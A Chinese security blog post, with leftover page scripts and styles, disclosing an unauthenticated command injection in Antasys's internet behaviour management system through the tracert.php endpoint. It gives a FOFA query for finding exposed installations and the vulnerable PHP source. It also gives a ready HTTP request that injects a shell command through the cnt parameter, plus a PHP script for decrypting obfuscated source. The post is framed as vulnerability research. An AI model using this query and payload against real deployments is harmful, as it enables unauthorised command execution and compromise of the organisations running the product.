---
title: "汉塔科技上网行为管理系统 tracert.php 命令注入漏洞"
source: https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html
asset_dir: assets/汉塔科技上网行为管理系统-tracert.php-命令注入漏洞
---

# 汉塔科技上网行为管理系统 tracert.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/30 08:37
* 1201浏览
* [0评论](#comment)
* 51分钟阅读

深入探索

tracert

服务器

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉塔科技 - 上网行为管理系统是上海汉塔网络科技有限公司开发的一款上网行为流量管理系统。其系统 `tracert.php` 存在[命令注入](https://mrxn.net/tag/rce)漏洞，未授权攻击者可利用此漏洞在服务器上[执行](https://mrxn.net/tag/rce)任意系统命令，造成系统失陷、敏感数据泄露等高危风险。

网络监控与管理

# 影响版本

# fofa语法

> `body="Antasys"`

# 漏洞分析

> 系统比较古老，使用的是威盾PHP混淆加密，可以参考附录部分代码进行批量解密或者使用参考链接部分进行在线单个文件解密。

直接看 `dgn/dgn_tools/tracert.php` 的业务逻辑实现关键部分

深入探索

恶意软件分析工具

安全研究工具

SQL注入防护

```
<?php

ini_set('display_errors', 1);
error_reporting(E_ALL ^ E_NOTICE);
$trace_ip_addr = $_REQUEST['ipdm'];
$maxhops = $_REQUEST['cnt'];
if (get_magic_quotes_gpc()) {
    $trace_ip_addr = stripslashes($trace_ip_addr);
}
if (strlen($trace_ip_addr) <= 50) {
    if (1) {
        echo '<pre>' . "\n" .
            'traceroute ' . $trace_ip_addr . "<br>";
        system('traceroute ' . $trace_ip_addr . ' -m ' . $maxhops);
        echo '</pre>' . "\n" .
            '<p>Trace complete.</p>' . "\n";
    } else {
        echo '<p>Please enter a valid IP address.</p>' . "<br>";
    }
} else {
    echo '<p>An illegal operation was encountered.</p>' . "<br>";
}
?>
```

通过 `$_REQUEST` 超全局变量获取 `ipdm` 和 `cnt` 参数值后，对前者使用 `get_magic_quotes_gpc()` 对获取的 `$trace_ip_addr` 进行单双引号反斜杠以及null字符进行转义（添加反斜杠），命令注入时需要注意。其次是判断 `$trace_ip_addr` 的长度小于等于50就直接拼接进 system函数进行[命令执行](https://mrxn.net/tag/rce)，无任何过滤，造成命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
GET /dgn/dgn_tools/tracert.php?cnt=1;set;&ipdm=127.0.0.1 HTTP/1.1
Host: antasys.test
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
```

两个参数均存在命令注入

代码安全审计

[![汉塔科技上网行为管理系统 tracert.php 命令注入漏洞](images/img-001-7f3f76f2339b.webp)](https://image.mrxn.net/2e6e1ae43cab4258a5e579498daf0c43.webp)

[![汉塔科技上网行为管理系统 tracert.php 命令注入漏洞](images/img-002-e2eff19e6455.webp)](https://image.mrxn.net/5a861560f42e4ad88b6530fb06aa9353.webp)

成功执行命令并回显结果。

漏洞修复方案

# 附录

威盾PHP解密，批量解密： `https://gist.github.com/Mr-xn/2c749d160cb4b7460b504c9cf0376ec6`

```
<?php
/***********************************
 *威盾PHP加密专家解密算法 By：zhrt
 *http://www.oicto.com
 *2013.12.31
 *把该程序放到网站程序的目录下，即可针对文件所在目录及子目录的文件进行破解，源加密文件被更改名为.bak.php.
 ***********************************/

//decode("Image.class.php");

function explorerdir($dir)
{
    $dp=opendir($dir); //打开目录句柄
    //echo " ".$dir."\r\n"; //输出目录
    while ($file = readdir($dp)) //遍历目录
    {
        if ($file !='.'&&$file !='..') //如果文件不是当前目录及父目录
        {
            $path=$dir.DIRECTORY_SEPARATOR.$file; //获取路径
            if(is_dir($path)) //如果当前文件为目录
            {
                explorerdir($path);   //递归调用
            }
            else   //如果不是目录
            {

                //echo "-".$path."\n"; //输出文件名

                echo decode($path);

            }
        }
    }
    closedir($dp);    //关闭文件名柄

}
explorerdir(".");    //调用当前目录

function decode($filename="")
{

    if(pathinfo($filename, PATHINFO_EXTENSION)!="php" || strpos($filename,".bak.php") || realpath($filename) == __FILE__ ){return;}

    //$filename="intro.class.php";//要解密的文件

    if(!file_exists($filename))
    {
        exit("file is not exist;");

    }

    $lines = file($filename);//0,1,2行

    //第一次base64解密
    $content="";
    if(preg_match("/O0O0000O0\('.*'\)/",$lines[1],$y))
    {
        $content=str_replace("O0O0000O0('","",$y[0]);
        $content=str_replace("')","",$content);
        $content=base64_decode($content);
    }
    else
    {
        weidun_log(false,realpath($filename)." is not Encrypted!");
        return false;

    }
    //第一次base64解密后的内容中查找密钥
    $decode_key="";
    if(preg_match("/\),'.*',/",$content,$k))
    {
        $decode_key=str_replace("),'","",$k[0]);
        $decode_key=str_replace("',","",$decode_key);
    }
    //查找要截取字符串长度
    $str_length="";
    if(preg_match("/,\d*\),/",$content,$k))
    {
        $str_length=str_replace("),","",$k[0]);
        $str_length=str_replace(",","",$str_length);
    }
    //截取文件加密后的密文
    $Secret=substr($lines[2],$str_length);
    //echo $Secret;

    //直接还原密文输出
    echo "<!-- <?php\n".base64_decode(strtr($Secret,$decode_key,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'))."?> -->"; //很奇怪，去掉这行，下面的代码就出现问题，可能跟编码有关，在这里我就暂时不做进一步分析了，注视掉避免界面缭乱。
    //echo "解密中....\<br>";
    $filecontent = "<?php\n".base64_decode(strtr($Secret,$decode_key,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'))."?>";
    //echo $filecontent;
    $filenamebak = str_replace(".php",".bak.php",$filename);

    if(!file_exists($filenamebak)){

        if(rename($filename,$filenamebak))
        {

            if(!file_exists($filename) && file_exists($filenamebak))//文件被更改成功
            {

                $fp = fopen($filename,"w");
                fwrite($fp,$filecontent);
                fclose($fp);

            }

        }

    }else{

        //return("备份文件".$filenamebak."已存在，停止解密。");
        weidun_log(false,realpath($filenamebak)." is exist!");
        return false;

    }
    weidun_log(true,realpath($filename)." - successful!");
    return $filename." - successful! \n";

}

function weidun_log($s = true,$c ="")
{

    if($s)
    {
        $fp = fopen("./log.txt","a+");
        fwrite($fp,$c."\n");
        fclose($fp);
    }
    else
    {
        $fp = fopen("./log_error.txt","a+");
        fwrite($fp,$c."\n");
        fclose($fp);
    }

}
?>
```

在线单个文件解密：`https://yoursunny.com/p/PHP-decode/`

PS： 最近刚好在公众号看到有人去蛐蛐漏洞提交者的，啥心态啊， 这些洞真不是啥不得了的大洞。

计算机服务器

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.附录](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉塔科技上网行为管理系统 tracert.php 命令注入漏洞](https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html)  
文章链接：<https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/antasys-dgn\_tools-tracert-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK/UlEQVR4AeyagXbbxg5Effv//9yX0eaSILikZMW29Br2dDLAYACuF2LiuP3n4+Pj32fxb/unzrGkZj5jPbIe83DXej7zRKuwZ8bVdxT3vuqzVrVn4izkV9/177vcwLKQXxv+eBRHh6/9etTMKwMfwO65sNdrX2IYnsQChuYz5V6H4QMsLWdYhF9B7/8l3f4Fdue+Fcov9j7Cpe1jWUgVr/h1N7BbCIztw56PjgnDO6vDtgYjB2b2jQbcPomw8sbQEj+NyjD61GcMw2NP9aj9CcOYD3uezd0tZGa6tJ+7gR9bCIxPyNknEIbHL796jXvN/LMM41l9bp0D5x4YdaC2/VH8Ywv5o1P+Rc1fspDZpwy4/f7vXeqBoQOWbj5Y8zOvTcCtzzwMQ4PB0Spg6LB+Z2cd1hqM+Kim/h38JQv5joP9rTO/ZyF/621+wde9W4i/Xcz4mec5B7a/DWSWtc6w98JW6z01z+wKGL1nnlrrsbO6XnM9naunx92bfLeQiBdedwPLQmB8iuA+9+PC6On6LK+fEtj2wcj11P6ZljqMHiDpBkc9MQGbbwpgm1ePc2DrgZEDsW8A3ObDfa6Ny0KqeMWvu4F/3P4z7LHtNQ/PtOgzwPgU2QPbPDoMrfenJnrNfFZXgzG357B+awzD47wzds6zfL0hZ7f7gtrhQmB8KmBlzwerBihvGNj8HuonBlZdTYZRcxCMHNZP66wGqw/QsmNgcyZg5/EsYYuJK4DbnKrpPWMYfTB45j1cyMx8ad9/A//A2BZs+ezRfjL0wOg1nzEMj71hGBoMjnYEuO+ZPbdqdXbVE8OYn/gIsPXAyOExdq7nMK/8//SG1HP/Z+NrIW+22t23vf18vl5h2L6a0Spqr7qaOawz1GS9M9YDo//M02uw73Ge3p5Hh9EHg6MFM69a5/jvAcZ84Ppv6h9v9s/uD3XP56bNK/cajA1XDwyte6vnT2IY8+sM2GupewYYdVg59QCGlvgr4bMrw3gWDK7Pu/4MqbfxBvFuIW4S9tvrNdh6YOSw/kUOVg1WPbNg1LwHGDkcc/oqYPU6R4ZRM59xnZX4EQ+MufELGBoMdg6MHFa2R0/l3UJq8Yp//gYOv8uabRHGlme1e0e3B8YMWN8WGJoz9Fa2Bluverj6a5xah3UY82Bw9XVPrSWG0QPr1xL9CM6zbl75ekO8nTfhayFvsgiPsfu2F9bXENB3Y18tYPPTzlux/QL3PbY4V1aHMQNQWv6naGBzhvTC0Bbz7wCGHo/4XVrmdT112PZFq7AnXPXEMHoTd8Bx7XpD+m29OF8Wki0HnidxYF45egDbTUfrgOGBwbXuTBg12PKZ197K+tVgzFOHkcOe7anc+2otMezn2DNjGP70BjByWHlZSAwXXn8Dy0JgbMnNnh0NhlfPIz16YPTCys6R9ZpXPqtVX+LuNQ+nPgOs54IR64ORp79DjwzDax7uPeapiWUhChe/9gaWvxj2Y8DYMKysx83K6pVh9KnBNo9+1p/6GeyFMRdW7n0walW3X64147NaPDDmAkm/BNcb8iXX+HVDlr+H+GkAbt/fnz0Cth7Y5ul1nhztHj7jPZsF4zww+FkvjP6jc6mHj54BYwasfOSNfr0huYWvx9MTr4U8fXXf03h3IXkdhUcwh/EaqleGUYPB9lSP8VENRi+gdcf2hi